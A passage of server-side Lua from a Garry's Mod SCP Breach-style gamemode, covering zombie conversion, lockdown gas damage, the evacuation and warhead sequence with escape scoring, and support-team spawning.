					if ( !string.EndsWith( stringpath, "/" ) ) then
		
						stringpath = stringpath .. "/"
		
					end
		
				end
		
			end
		
			for k, v in ipairs( ent:GetMaterials() ) do
		
				local sNewmaterial;
				if ( !string.find( v, "/heads/" ) && !string.find( v, "/shared/" ) ) then
		
					sNewmaterial = string.Replace( v, stringpath, "/zombies" .. stringpath )
		
				end
		
		
				ent:SetSubMaterial( k - 1, sNewmaterial )
		
			end
	

			ent.JustSpawned = true
			timer.Simple( .1, function()
			    ent.JustSpawned = false
			end)
			ent:StripWeapons()
			ent:SetGTeam(TEAM_SCP)
			ent:SetHealth( ent:GetMaxHealth() * 2 )
			ent:SetMaxHealth( ent:GetMaxHealth() * 2 )
			ent:Give( "weapon_scp_049_2_1" )
			ent:SelectWeapon( "weapon_scp_049_2_1" )
			ent:SetArmor( 0 )

			ent:Flashlight( false )
			ent:AllowFlashlight( false )

		end
	end
end
--concommand.Add("just", SetZombie1)

function SetZombie2( ent )
	if ent:IsPlayer() then
		if ent:GTeam() != TEAM_SPEC or ent:GTeam() != TEAM_SCP then
			if ( ent.BoneMergedHead ) then

				for _, v in pairs( ent.BoneMergedHead ) do
		
					if ( v && v:IsValid() ) then

				
						v:SetMaterial("models/cultist/heads/zombie_face")

					end
				end
			end
			ent.JustSpawned = true
			timer.Simple( 1, function()
			    ent.JustSpawned = false
			end)
			ent:StripWeapons()
			ent:SetGTeam(TEAM_SCP)
			ent:SetHealth( ent:GetMaxHealth() * 15 )
			ent:SetMaxHealth( ent:GetMaxHealth() * 15 )
			ent:SetWalkSpeed( ent:GetWalkSpeed() / 2 )
			ent:SetRunSpeed( ent:GetRunSpeed() / 2.5 )
			ent:Give( "weapon_scp_049_2_2" )
			ent:SelectWeapon( "weapon_scp_049_2_2" )
			ent:SetArmor( 100 )

			ent:Flashlight( false )
			ent:AllowFlashlight( false )
			ent:Freeze( true )
			ent:DoAnimationEvent(ACT_GET_UP_STAND)
			timer.Simple( 3, function()
			    ent:Freeze( false )
			end)
		end
	end
end
--concommand.Add("just_2", SetZombie2)

BREACH = BREACH || {}

BREACH.Gas = BREACH.Gas || false

LZ_DOORS = {
	Vector( 6816.000000, -1504.410034, 56.799999 ),
	Vector( 6944.000000, -1503.319946, 56.799999 ),
	Vector( 7435.200195, -1040.810059, 56.799999 ),
	Vector( 8096.000000, -1503.410034, 56.799999 ),
	Vector( 8224.000000, -1503.459961, 56.799999 ),
	Vector( 4672.410156, -2288.000000, 55.500000 ),
	Vector( 4671.319824, -2160.000000, 55.500000 ),
	Vector( 9569.030273, -533.419983, 56.799999 ),
	Vector( 9697.030273, -532.320007, 56.799999 ) -- 9
}

LZ_SOUNDEF = {
	soundef = {
		amount = 5,
		spawns = {
			Vector( 4828.812988, -2220.947021, 64.031250 ),
			Vector( 6885.969238, -1675.001587, 65.331055 ),
			Vector( 7444.067383, -1140.520264, 65.331055 ),
			Vector( 8160.740723, -1668.191162, 65.331055 ),
			Vector( 9632.721680, -687.500488, 65.331055 ),
		},
	}
}

function GasEnabled( enabled )

	BREACH.Gas = enabled

end

function GetGasEnabled()

	return BREACH.Gas

end

function LZCPIdleSound()
	LZCPIdleSound1()
	LZCPIdleSound2()
	LZCPIdleSound3()
	LZCPIdleSound4()
	LZCPIdleSound5()
end

function LZCPIdleSound1()

	local sound_ef = ents.Create( "br_gift" )
	if IsValid( sound_ef ) then
		sound_ef:Spawn()
		sound_ef:SetPos( Vector( 9632.721680, -687.500488, 65.331055 ) )
	end
	timer.Simple( 30, function()
		sound_ef:Remove()
	end)
end

function LZCPIdleSound2()

	local sound_ef = ents.Create( "br_gift" )
	if IsValid( sound_ef ) then
		sound_ef:Spawn()
		sound_ef:SetPos( Vector( 8160.740723, -1668.191162, 65.331055 ) )
	end
	timer.Simple( 30, function()
		sound_ef:Remove()
	end)
end

function LZCPIdleSound3()

	local sound_ef = ents.Create( "br_gift" )
	if IsValid( sound_ef ) then
		sound_ef:Spawn()
		sound_ef:SetPos( Vector( 7444.067383, -1140.520264, 65.331055 ) )
	end
	timer.Simple( 30, function()
		sound_ef:Remove()
	end)
end

function LZCPIdleSound4()

	local sound_ef = ents.Create( "br_gift" )
	if IsValid( sound_ef ) then
		sound_ef:Spawn()
		sound_ef:SetPos( Vector( 6885.969238, -1675.001587, 65.331055 ) )
	end
	timer.Simple( 30, function()
		sound_ef:Remove()
	end)
end

function LZCPIdleSound5()

	local sound_ef = ents.Create( "br_gift" )
	if IsValid( sound_ef ) then
		sound_ef:Spawn()
		sound_ef:SetPos( Vector( 4828.812988, -2220.947021, 64.031250 ) )
	end
	timer.Simple( 30, function()
		sound_ef:Remove()
	end)
end

function EvacuationEnd()

	SetGlobalBool("Evacuation", false)

	timer.Destroy("Evacuation")

end
--concommand.Add("EvacuationEnd", EvacuationEnd)

function EvacuationWarheadEnd()

	timer.Destroy("EvacuationWarhead")

	timer.Remove("BigBoom")

	timer.Remove("BigBoomEffect")

	timer.Remove("Edem")

	timer.Remove("EdemChaos")

	timer.Remove("EdemChaos2")

	timer.Remove("Prizemlyt")

	timer.Remove("PrizemlytAng")

	timer.Remove("Back")

	timer.Remove("BackCI")

	timer.Remove("Uletaem")

	timer.Remove("EdemNazad")

	timer.Remove("UletaemAng")

	timer.Remove("Back2")

	timer.Remove("DeleteHelic")

	timer.Remove("DeleteJeep")

	timer.Remove("EdemAnim")

	timer.Remove("AnimOpened")

	timer.Remove("AnimOpen")

	timer.Remove("AnimClosed")

	timer.Remove("EdemNazadAnim")

	timer.Remove("EdemCIAnimStop")

	timer.Remove("EdemCIAnim")

	timer.Remove("EdemCIAnimNazad")

	timer.Remove("EdemAnim2")

	timer.Remove("O5Warhead_Start") 

	timer.Remove("AlphaWarhead_Begin")

	timer.Remove("AlphaWarhead_Start")

	Additionaltime = 0


	for k, v in pairs( ents.FindByClass("base_gmodentity") ) do

	    v:Remove()
	end

end

function SetClothOnPlayer(ply, type)
	local self = scripted_ents.Get(type)

	ply:EmitSound( Sound("nextoren/others/cloth_pickup.wav") )

				if ply.BoneMergedHackerHat then

					for _, v in pairs( ply.BoneMergedHackerHat ) do
			
						if ( v && v:IsValid() ) then
							
							v:SetInvisible(true)
			
						end

					end

				end

				if ( self.HideBoneMerge ) then
			
					for _, v in pairs( ply:LookupBonemerges() ) do
			
						if ( v && v:IsValid() && !v:GetModel():find("backpack") ) then
							
							v:SetInvisible(true)
			
						end

					end
			
				end
				if type == "armor_medic" or type == "armor_mtf" then
					for _, v in pairs( ply:LookupBonemerges() ) do
			
						if ( v:GetModel():find("hair") and !ply:IsFemale() ) then
					
							v:SetInvisible(true)
			
						end
			
					end
				end
				ply.OldModel = ply:GetModel()
				ply.OldSkin = ply:GetSkin()
				if ( self.Bodygroups ) then
			
					ply.OldBodygroups = ply:GetBodyGroupsString()
			
					ply:ClearBodyGroups()

					ply.ModelBodygroups = self.Bodygroups
			
					if ( self.Bonemerge ) then
			
						for _, v in ipairs( self.Bonemerge ) do
			
							GhostBoneMerge( ply, v )
			
						end
			
					end
			
				end
				if self.MultiGender then
					if ply:IsFemale() then
						ply:SetModel(self.ArmorModelFem)
					else
						ply:SetModel(self.ArmorModel)
					end
				else
					ply:SetModel(self.ArmorModel)
				end
				if ( self.ArmorSkin ) then
					ply:SetSkin(self.ArmorSkin)
				end

				hook.Run("BreachLog_PickUpArmor", ply, type)
				if isfunction(self.FuncOnPickup) then self.FuncOnPickup(ply) end
			
				ply:BrTip( 0, "[RX Breach]", Color( 0, 210, 0, 180 ), "l:your_uniform_is "..L(self.PrintName), Color( 0, 255, 0, 180 ) )
				ply:SetupHands()
				if self.ArmorSkin then
					ply:GetHands():SetSkin(self.ArmorSkin)
				end

				timer.Simple( .25, function()
			
						for bodygroupid, bodygroupvalue in pairs( ply.ModelBodygroups ) do
							
							if !istable(bodygroupvalue) then
								ply:SetBodygroup( bodygroupid, bodygroupvalue )
							end
			
						end
			
					end )
end

concommand.Add("br_wearcloth", function(ply, str, _, type)

	if !ply:IsSuperAdmin() then return end

	SetClothOnPlayer(ply, type)

end)

concommand.Add("br_wearcloth_target", function(ply, str, _, type)

	if !ply:IsSuperAdmin() then return end

	SetClothOnPlayer(ply:GetEyeTrace().Entity, type)

end)

--concommand.Add("EvacuationWarheadEnd", EvacuationWarheadEnd)

function Evacuation()

	SetGlobalBool("Evacuation", true)

	BREACH.Players:ChatPrint(player.GetHumans(), true, true, "l:evac_start_leave_immediately")

	PlayAnnouncer( "nextoren/round_sounds/intercom/start_evac.ogg" )

	SHAKY_MUSIC_STARTTIME = SysTime()

	BroadcastPlayMusic(BR_MUSIC_EVACUATION)
	--BroadcastLua("BREACH.Evacuation=true PickupActionSong()BREACH.Evacuation=false")

end
--concommand.Add("Evacuation", Evacuation)

function EvacuationWarhead()

	PlayAnnouncer("nextoren/round_sounds/main_decont/final_nuke.mp3")

	for i, v in pairs(player.GetHumans()) do v:BrTip(0, "[RXSEND]", Color(255,0,0,200), "l:evac_start", color_white) end

	local portal = ents.Create("portal")
	portal:Spawn()
	timer.Simple(120, function()
		EscapeEnabled_Portal = false
		portal:Remove()
	end)

	for _, ply in ipairs(player.GetAll()) do

		if ply:GTeam() != TEAM_SPEC then

	        ply:Tip( "[NO Breach]", Color(255, 0, 0), "Запущена Альфа-Боеголовка! Через 2 минуты 20 секунд, будет сдетонирована боеголовка.", Color(255, 255, 255) )

		end

	end

	SetGlobalBool("Evacuation_HUD", true)

	timer.Create("PerformEscapeAnim_APC", 110, 1, function()
		if IsValid(apc) then
			timer.Simple(0.2, function() apc:Escape() end)
			local classdrescueamount = 0
			local Str = "Evacuated through the APC."
			for _, ply in pairs(ents.FindInBox( Vector(2205.7585449219, 6494.1030273438, 1780.3236083984), Vector(2752.3601074219, 7220.3330078125, 1482.2497558594) )) do
				if IsValid(ply) and ply:IsPlayer() and ( ply:GTeam() == TEAM_CHAOS or ply:GTeam() == TEAM_CLASSD or ply:GetRoleName() == SCP999 ) then
					if !ply:Alive() or ply:Health() <= 0 then continue end
					if ply:GTeam() == TEAM_CLASSD then
						for _, chaos in pairs(player.GetAll()) do
							if chaos:GTeam() == TEAM_CHAOS then chaos:AddToStatistics("l:ci_classd_evac", 100) end
						end
						ply:AddToStatistics("l:escaped", 500)
						if ply:HasWeapon("weapon_duck") then
							ply:AddToStatistics("l:cheemer_rescue", 1000)
						end
						classdrescueamount = classdrescueamount + 1
						if classdrescueamount == 1 then
							Str = "l:ending_ci_evac_apc_pt1 "..classdrescueamount.." l:ending_ci_evac_apc_pt2"
						else
							Str = "l:ending_ci_evac_apc_pt1 "..classdrescueamount.." l:ending_ci_evac_apc_pt2_many"
						end
						net.Start("Ending_HUD")
							net.WriteString("l:ending_evac_apc")
						net.Send(ply)
						ply:CompleteAchievement("escape")
						ply:CompleteAchievement("apcescape")
						ply:LevelBar()
						ply:SetupNormal()
						ply:SetSpectator()
					elseif ply:GetRoleName() == SCP999 then
						for _, chaos in pairs(player.GetAll()) do
							if chaos:GTeam() == TEAM_CHAOS then chaos:AddToStatistics("l:ci_scp_evac", 400) end
						end
						ply:AddToStatistics("l:escaped", 350)
						if ply:HasWeapon("weapon_duck") then
							ply:AddToStatistics("l:cheemer_rescue", 1000)
						end
						net.Start("Ending_HUD")
							net.WriteString("l:ending_evac_apc")
						net.Send(ply)
						ply:CompleteAchievement("escape")
						ply:CompleteAchievement("apcescape")
						ply:LevelBar()
						ply:SetupNormal()
						ply:SetSpectator()
					elseif ply:GTeam() == TEAM_CHAOS then
						timer.Simple(0.1, function()
							ply:AddToStatistics("l:escaped", 500)
							if ply:HasWeapon("weapon_duck") then
								ply:AddToStatistics("l:cheemer_rescue", 1000)
							end
							net.Start("Ending_HUD")
								net.WriteString(Str)
							net.Send(ply)
							ply:CompleteAchievement("escape")
							ply:CompleteAchievement("apcescape")
							ply:LevelBar()
							ply:SetupNormal()
							ply:SetSpectator()
						end)
					end
				end
			end
		end
	end)

	local guardteams = {
		[TEAM_GUARD] = true,
		[TEAM_NTF] = true,
		[TEAM_SECURITY] = true,
		[TEAM_QRT] = true,
		[TEAM_OSN] = true,
		[TEAM_GOC_CONTAIN] = true,
		[TEAM_GOC] = true,
	}

	local sciteams = {
		[TEAM_SCI] = true,
		[TEAM_SPECIAL] = true,
	}

	timer.Simple(90, function()
		if IsValid(heli) then
			heli:EmitSound("nextoren/vo/chopper/chopper_ten_left.wav", 130, 100, 1.5, CHAN_VOICE, 0, 0)
		end
	end)

	timer.Simple(70, function()
		if IsValid(heli) then
			heli:EmitSound("nextoren/vo/chopper/chopper_thirty_left.wav", 130, 100, 1.5, CHAN_VOICE, 0, 0)
		end
	end)

	timer.Create("PerformEscapeAnim_HELI", 100, 1, function()
		if IsValid(heli) then
			heli:EmitSound("nextoren/vo/chopper/chopper_evacuate_end.wav", 110, 100, 1.2, CHAN_VOICE, 0, 0)
			heli:Escape()
			goose_plz_fuck_off_heli()
			for _, ply in pairs(ents.FindInBox( Vector(-3138.5959472656, 5161.6767578125, 2607.9836425781), Vector(-3894.0668945313, 4376.7807617188, 2480.7956542969) )) do
				if IsValid(ply) and ply:IsPlayer() and ( ply:GetRoleName() == SCP999 or guardteams[ply:GTeam()] or sciteams[ply:GTeam()] or ply:GetModel():find("/sci/") ) then
					if !ply:Alive() or ply:Health() <= 0 then continue end
					if ( sciteams[ply:GTeam()] or ply:GetModel():find("/sci/") or ply:GetModel():find("/mog/") ) and !guardteams[ply:GTeam()] and ply:GetRoleName() != role.Dispatcher and ply:GTeam() != TEAM_GOC then
						for _, guard in pairs(player.GetAll()) do
							if guardteams[guard:GTeam()] and ply:GTeam() == TEAM_SPECIAL then guard:AddToStatistics("l:vip_evac", 200) end
							if guardteams[guard:GTeam()] and ply:GTeam() == TEAM_SCI then guard:AddToStatistics("l:sci_evac", 100) end
						end
						local achievement = false
						if !sciteams[ply:GTeam()] and ( ply:GetModel():find("/mog/") or ply:GetModel():find("/sci/") ) then
							if math.random(1, 4) > 1 or ply:GTeam() == TEAM_DZ then
								ply:AddToStatistics("l:escaped", 450)
								achievement = true
							else
								ply:RXSENDNotify("l:evac_disclosed")
								ply:AddToStatistics("l:escape_fail", -45)
								achievement = true
							end
						else
							ply:AddToStatistics("l:escaped", 500)
						end
						if ply:HasWeapon("weapon_duck") then
							ply:AddToStatistics("l:cheemer_rescue", 500)
						end
						net.Start("Ending_HUD")
							net.WriteString("l:ending_evac_choppa")
						net.Send(ply)
						ply:CompleteAchievement("escape")
						ply:LevelBar()
						ply:SetupNormal()
						ply:SetSpectator()
						if achievement then
							ply:CompleteAchievement("wrongescape")
						end
					elseif ply:GetRoleName() == SCP999 then
						for _, guard in pairs(player.GetAll()) do
							if guardteams[guard:GTeam()] then guard:AddToStatistics("l:ci_scp_evac", 400) end
						end
						ply:AddToStatistics("l:escaped", 350)
						net.Start("Ending_HUD")
							net.WriteString("l:ending_evac_apc")
						net.Send(ply)
						ply:CompleteAchievement("escape")
						ply:CompleteAchievement("apcescape")
						ply:LevelBar()
						ply:SetupNormal()
						ply:SetSpectator()
					elseif guardteams[ply:GTeam()] then
						timer.Simple(0.6, function()
							ply:AddToStatistics("l:escaped", 500)
							if ply:HasWeapon("weapon_duck") then
								ply:AddToStatistics("l:cheemer_rescue", 1000)
							end
							net.Start("Ending_HUD")
								net.WriteString("l:ending_evac_choppa")
							net.Send(ply)
							ply:CompleteAchievement("escape")
							ply:LevelBar()
							ply:SetupNormal()
							ply:SetSpectator()
						end)
					end
				end
			end
		end
	end)

	timer.Create("BigBoomEffect", 130, 1, function()
		AlphaWarheadBoomEffect()
		BroadcastLua("StopMusic()")
	end)

	timer.Create("BigBoom", 135, 1, function()
		for _, ply in ipairs(player.GetAll()) do

			if ply:GTeam() != TEAM_SPEC and ply:Health() > 0 and ply:Alive() then

				ply:Kill()

			end

		end
	end)

end

function AlphaWarheadBoomEffect()
	BroadcastLua( 'surface.PlaySound( "nextoren/ending/nuke.mp3" )' )
	net.Start("Boom_Effectus")
	net.Broadcast()
end
--concommand.Add("EvacuationWarhead", EvacuationWarhead)

function FakeAlphaWarheadBoomEffect()
	BroadcastLua( 'surface.PlaySound( "nextoren/ending/nuke.mp3" )' )
	net.Start("Fake_Boom_Effectus")
	net.Broadcast()
end
concommand.Add("bomba123", function(ply, cmd, args)
	if !ply:IsSuperAdmin() then return end

	FakeAlphaWarheadBoomEffect()
end)

function LZLockDown()

	LZCPIdleSound()

	--net.Start("ForcePlaySound")
	PlayAnnouncer("nextoren/round_sounds/lhz_decont/decont_countdown.ogg")
	--net.Broadcast()

	for k, v in pairs( ents.FindByClass( "func_door" ) ) do
		if v:GetPos() == LZ_DOORS[1] or v:GetPos() == LZ_DOORS[2] or v:GetPos() == LZ_DOORS[3] or v:GetPos() == LZ_DOORS[4] or v:GetPos() == LZ_DOORS[5] or v:GetPos() == LZ_DOORS[6] or v:GetPos() == LZ_DOORS[7] or v:GetPos() == LZ_DOORS[8] or v:GetPos() == LZ_DOORS[9] then
			timer.Create( "DoorLZOpen"..v:EntIndex(), 9, 1, function()
				v.NoAutoClose = true
			    v:Fire( "Open" )
			end )
			timer.Create( "DoorLZClose"..v:EntIndex(), 45, 1, function()
				--net.Start("ForcePlaySound")
				PlayAnnouncer("nextoren/round_sounds/lhz_decont/decont_ending.ogg")
				--net.Broadcast()
				v:Fire( "Close" )
				GasEnabled(true)
				
			end )
		end
	end

end

local nextthink = 0
hook.Add("Think", "Breach_Gas_Think", function()
	if !GetGasEnabled() then return end
	if nextthink > CurTime() then return end

	nextthink = CurTime() + 1.6
	for _, ply in pairs(player.GetAll()) do
		if ply:GTeam() == TEAM_SPEC then continue end
		if ply:Health() <= 0 then continue end
		if !ply:Alive() then continue end
		if ply:GetRoleName() == "CI Soldier" then continue end
		if ply:GetRoleName() == "CI Juggernaut" then continue end
		if ply:GetRoleName() == "NTF Grunt" then continue end
		if ply:GTeam() == TEAM_DZ and ply:GetRoleName() != "SH Spy" then continue end
		if !ply:IsLZ() then continue end
		if ply:HasHazmat() and ply:GetRoleName() != role.ClassD_Banned then continue end 
		if ply.GASMASK_Equiped and ply:GetRoleName() != role.ClassD_Banned then continue end
		if ply:GetRoleName() == "SCP173" then continue end
		if ply:GetRoleName() == SCP999 then continue end
		local dmg = ply:GetMaxHealth() / 40
		if ply:GTeam() != TEAM_SCP then
			ply:EmitSound("^nextoren/unity/cough"..tostring(math.random(1,3))..".ogg", 75, 100, 1.5, CHAN_VOICE)
			dmg = 15
		end
		local dmginfo = DamageInfo()
		dmginfo:SetAttacker(ply)
		dmginfo:SetInflictor(ply)
		dmginfo:SetDamage(dmg)
		if ply:GetRoleName() != role.ClassD_Banned then
			dmginfo:SetDamageType(DMG_NERVEGAS)
		end
		ply:TakeDamageInfo(dmginfo)
		--ply:TakeDamage(15, ply, ply)
	end
end)

--concommand.Add( "LZLockDown", LZLockDown )

function LZLockDownEnd()

	GasEnabled(false)

end

function OBRSpawn(count)
	if disableobr then return end
	if GetGlobalBool("Evacuation_HUD", false) then return end
	if !timer.Exists("Evacuation") then return end
	if timer.TimeLeft("Evacuation") <= 10 then return end

	local roles = {}
	local plys = {}
	local inuse = {}
	local spawnpos = table.Copy(SPAWN_OBR)

	local messageinter

		for k, v in pairs( BREACH_ROLES.OBR.obr.roles ) do
			if v.team == TEAM_QRT then
				table.insert( roles, v )
			end
		end

		for k, v in pairs( roles ) do
			plys[v.name] = {}
			inuse[v.name] = 0
			for _, ply in pairs( player.GetAll() ) do

				if ply:GTeam() == TEAM_SPEC and ply.ActivePlayer and ply:GetPenaltyAmount() <= 0 and ply.SpawnAsSupport != false then
					if ply:GetLevel() >= v.level and ( v.customcheck and c.customcheck( ply ) or true ) then
						ply.ArenaParticipant = false
						table.insert( plys[v.name], ply )
					end
				end

			end

			if #plys[v.name] < 1 then
				roles[k] = nil
			end
		end

		if #roles < 1 then
			return
		end

		for i = 1, math.Clamp(#SPAWN_OBR, 0, count) do
			local role = table.Random( roles )
			local ply = table.remove( plys[role.name], math.random( 1, #plys[role.name] ) )
			ply:SetupNormal()
			ply:ApplyRoleStats( role )

			inuse[role.name] = inuse[role.name] + 1
			local selectedpos = spawnpos[math.random(1, #spawnpos)]
			table.RemoveByValue(spawnpos, selectedpos)
			selectedpos = Vector(selectedpos.x, selectedpos.y, GroundPos(selectedpos).z)
			ply:SetPos( selectedpos )

			if #plys[role.name] < 1 or inuse[role.name] >= role.max then
				table.RemoveByValue( roles, role )
			end

			if #roles < 1 then
				break
			end
		end

end
--[[
concommand.Add("br_enable_scarlet_skybox", function()
	SetGlobalBool("Scarlet_King_Scarlet_Skybox", true)
end)
--]]
--[[
concommand.Add("br_disable_scarlet_skybox", function()
	SetGlobalBool("Scarlet_King_Scarlet_Skybox", false)
end)
--]]

local function GetSupportRoleTable(supname)
	if supname == "FBI" then
		return BREACH_ROLES.FBI_AGENTS.fbi_agents.roles
	elseif supname == "FBI_SHTURM" then
		return BREACH_ROLES.FBI.fbi.roles
	elseif supname == "ALP_9" then
		return BREACH_ROLES.NTF.ntf.roles
	elseif supname == "GOC_IN" then
		return BREACH_ROLES.GOC_CONTAIMENTS.goc_contaiments.roles
	end
	return BREACH_ROLES[string.upper(supname)][string.lower(supname)].roles
end

function GetAvailableSupports()
	local tab = {}
	for supp, isused in pairs(SUPPORTTABLE) do
		if !SUPPORTTABLE[supp] then
			tab[#tab + 1] = supp
		end
	end
	return tab
end

local BigRoundOnlySupports = {
	"GOC",
	"COTSK",
	"DZ",
	"FBI"
}

local FirstRoundOnlySupports = {
	"GOC",
	"COTSK",
	"FBI"
}

local SecondRoundOnlySupports = {
	"COTSK",
	"FBI"
}

local RareSupports = {
	"GOC",
	"COTSK",
	"DZ",
}

local NotRareSupports = {
	"NTF",
	"CHAOS"
}

local LevelRequiredForSupport = {
	["GOC"] = 10,
	["COTSK"] = 10,
	["FBI_SHTURM"] = 7,
	["ARMY_IN"] = 7,
	["GOC_IN"] = 10,
	["FBI"] = 7
}

util.AddNetworkString("BreachAnnouncer")

function PlayAnnouncer(soundname)
	net.Start("BreachAnnouncer")
		net.WriteString(tostring(soundname))
	net.Broadcast()
end

function Start_Pilot_Spawn(user, num)

	user:SetupNormal()
	user:ApplyRoleStats(BREACH_ROLES.MINIGAMES.minigame.roles[4], true)
	if num == 1 then
		user:SetPos(Vector(-3582.238525, 4766.699219, 2506.970703))
	else
		user:SetPos(Vector(-3582.942383, 4870.370117, 2506.991211))
	end
	user:GiveTempAttach()

end

include("sh_roles_scp.lua")

local quicktables = {
	[TEAM_GOC] = BREACH_ROLES.GOC.goc.roles,
	[TEAM_CHAOS] = BREACH_ROLES.CHAOS.chaos.roles,
	[TEAM_USA] = BREACH_ROLES.FBI.fbi.roles,
	[TEAM_DZ] = BREACH_ROLES.DZ.dz.roles,
	[TEAM_NTF] = BREACH_ROLES.NTF.ntf.roles,
	[TEAM_COTSK] = BREACH_ROLES.COTSK.cotsk.roles,
	[1313] = BREACH_ROLES.FBI_AGENTS.fbi_agents.roles,
	[TEAM_GOC_CONTAIN]= BREACH_ROLES.GOC_CONTAIMENTS.goc_contaiments.roles,
}


function ProceedChangePremiumRoles()
	cutsceneinprogress = false

	for i, v in pairs(player.GetAll()) do
	
		if v.queuerole and v:GTeam() != TEAM_SPEC then

			local id = v.queuerole

			local quicktable = quicktables[v:GTeam()]

			if BREACH:IsUiuAgent(v:GetRoleName()) then quicktable = quicktables[1313] end

			local pos = v:GetPos()
			v:SetupNormal()
			v:ApplyRoleStats(quicktable[id], true)
			v:SetPos(pos)

		end

	end
end

local stringtoteam = {
	["FBI"] = TEAM_USA,
	["CHAOS"] = TEAM_CHAOS,
	["NTF"] = TEAM_NTF,
	["COTSK"] = TEAM_COTSK,
	["GOC"] = TEAM_GOC,
	["DZ"] = TEAM_DZ,
}

function SupportSpawn()
	if !developer then
		if disablesupport then return end
	end
	if !SUPPORTTABLE then
			SUPPORTTABLE = {
				["GOC"] = false,
				["FBI"] = false,
				["CHAOS"] = false,
				["NTF"] = false,
				["DZ"] = false,
				["COTSK"] = false,
			}
	end
	if supcount == nil then supcount = 0 end
	if !SPAWNEDPLAYERSASSUPPORT then SPAWNEDPLAYERSASSUPPORT = {} end

	for _, ent in pairs(ents.FindInBox(Vector(-8968.477539, 1821.646484, 3592.977051), Vector(-13574.76171875, -1229.5375976563, 1517.951171875))) do

		if !ent:IsPlayer() and !ent:CreatedByMap() and ent:GetClass() != "ent_weaponstation" then
			ent:Remove()
		elseif ent:IsPlayer() and ent:GTeam() != TEAM_SPEC then
			ent:SetupNormal()
			ent:SetSpectator()
			ent:RXSENDNotify("l:dont_spawncamp")
		end

	end

	local supportamount = {
		["GOC"] = 5,
		["FBI"] = 5,
		["CHAOS"] = 6,
		["NTF"] = 6,
		["DZ"] = 5,
		["COTSK"] = math.random(6,7),
	}

	if !IsBigRound() then
		for _, sup in pairs(BigRoundOnlySupports) do
			SUPPORTTABLE[sup] = true
		end
	end

	if supcount > 0 and IsBigRound() then
		for _, sup in pairs(FirstRoundOnlySupports) do
			SUPPORTTABLE[sup] = true
		end
	end


	if supcount > 1 and IsBigRound() then
		for _, sup in pairs(SecondRoundOnlySupports) do
			SUPPORTTABLE[sup] = true
		end
	end

	local supportlist = GetAvailableSupports()

	local pickedsupport = supportlist[math.random(1, #supportlist)]

	if supcount <= 0 and IsBigRound() then

		::repeatcheck::

		local chance = math.random(1, 100)
		local haverare = supcount <= 0 and IsBigRound()

		if chance <= 40 and haverare then

			pickedsupport = RareSupports[math.random(1, #RareSupports)]

		elseif chance <= 50 and !SUPPORTTABLE["FBI"] then

			pickedsupport = "FBI"

		else

			pickedsupport = NotRareSupports[math.random(1,#NotRareSupports)]

		end

		--if pickedsupport == "COTSK" then goto repeatcheck end

	end

	if forcesupport then
		forcesupport = false
		pickedsupport = forcesupportname
	end

	supcount = supcount + 1

	local maxamount = supportamount[pickedsupport]

	if !maxamount then maxamount = 5 end

	local pickedplayers = {}

	local pick = 0

	if forcesupportplys then
		for _, ply in pairs(forcesupportplys) do
			if pick >= maxamount then break end
			SPAWNEDPLAYERSASSUPPORT[#SPAWNEDPLAYERSASSUPPORT + 1] = ply
			pickedplayers[#pickedplayers + 1] = ply
			pick = pick + 1
		end
		forcesupportplys = nil
	end

	for _, ply in RandomPairs(GetActivePlayers()) do
		if pick >= maxamount then break end
		if ply:GTeam() != TEAM_SPEC then continue end
		if ply.SpawnAsSupport == false then continue end
		if ply:GetPenaltyAmount() > 0 then continue end
		if LevelRequiredForSupport[pickedsupport] and ply:GetNLevel() < LevelRequiredForSupport[pickedsupport] then continue end
		if table.HasValue(SPAWNEDPLAYERSASSUPPORT, ply) and !ply:IsSuperAdmin() then continue end
		SPAWNEDPLAYERSASSUPPORT[#SPAWNEDPLAYERSASSUPPORT + 1] = ply
		pickedplayers[#pickedplayers + 1] = ply
		if ply.LuckyOne then
			ply:CompleteAchievement("lucky")
		else
			ply.LuckyOne = true
		end
		pick = pick + 1
	end

	for _, ply in pairs(player.GetAll()) do
		if !table.HasValue(pickedplayers, ply) then
			ply.LuckyOne = false
		end 
	end

	SUPPORTTABLE[pickedsupport] = true

	if pickedsupport == "DZ" and supcount == 1 then
		BREACH.TempStats.DZFirst = true
	end

	local cutscene = 0

	if pickedsupport == "GOC" then
		PlayAnnouncer( "nextoren/round_sounds/intercom/support/goc_enter.mp3" )
	elseif pickedsupport == "FBI" then

		local spawntable = table.Copy(SPAWN_FBI_MONITORS)

		for i = 1, 5 do
			local selectedindx = math.random(1, #spawntable)
			local onp_monitor = ents.Create("onp_monitor")
			onp_monitor:SetPos(spawntable[selectedindx].pos)
			onp_monitor:SetAngles(spawntable[selectedindx].ang)
			onp_monitor:Spawn()
			onp_monitor:SetAngles(spawntable[selectedindx].ang)
			table.remove(spawntable, selectedindx)
		end

		cutscene = 2

	elseif pickedsupport == "NTF" then

		for _, announce in pairs(player.GetHumans()) do
			announce:BrTip(0, "[RX Breach]", Color(255,0,0,200), "l:ntf_enter", color_white)
		end
        
		PlayAnnouncer( "rxsend_music/cassie_no_scps2.mp3" )

	elseif pickedsupport == "COTSK" then

		PlayAnnouncer( "rxsend_music/xinghong.MP3")
		local book_cock = ents.Create("ent_cult_book")
		book_cock:Spawn()

	elseif pickedsupport == "CHAOS" then

		cutscene = 1

		PlayAnnouncer( "nextoren/round_sounds/intercom/support/enemy_enter.ogg" )

	else

		PlayAnnouncer( "nextoren/round_sounds/intercom/support/enemy_enter.ogg" )
	
	end

	local supinuse = {}
	local supspawns = table.Copy( SPAWN_OUTSIDE )
	local sups = {}

	local notp = cutscene != 0

	for i = 1, #pickedplayers do
		local ply = pickedplayers[i]

		local suproles = table.Copy( GetSupportRoleTable(pickedsupport) )
		local selected

		local shouldselectrole = true

		if pickedsupport == "COTSK" and i == 1 then
			supinuse[BREACH_ROLES.COTSK.cotsk.roles[3].name] = 1
			selected = BREACH_ROLES.COTSK.cotsk.roles[3]
			shouldselectrole = false
		end

		if pickedsupport == "CHAOS" and i == 1 then
			supinuse[BREACH_ROLES.CHAOS.chaos.roles[3].name] = 1
			selected = BREACH_ROLES.CHAOS.chaos.roles[3]
			shouldselectrole = false
		end

		if shouldselectrole then
			repeat
				local role = table.remove( suproles, math.random( #suproles ) )
				supinuse[role.name] = supinuse[role.name] or 0

				if role.max == 0 or supinuse[role.name] < role.max then
					if role.level <= ply:GetNLevel() then
						if !role.customcheck or role.customcheck( ply ) then
							supinuse[role.name] = supinuse[role.name] + 1
							selected = role
							break
						end
					end
				end
			until #suproles == 0
		end

		local spawn = table.remove( supspawns, math.random( #supspawns ) )

		ply:SetupNormal()
		ply:ApplyRoleStats( selected )
		if !notp then
			ply:SetPos( spawn )
		end

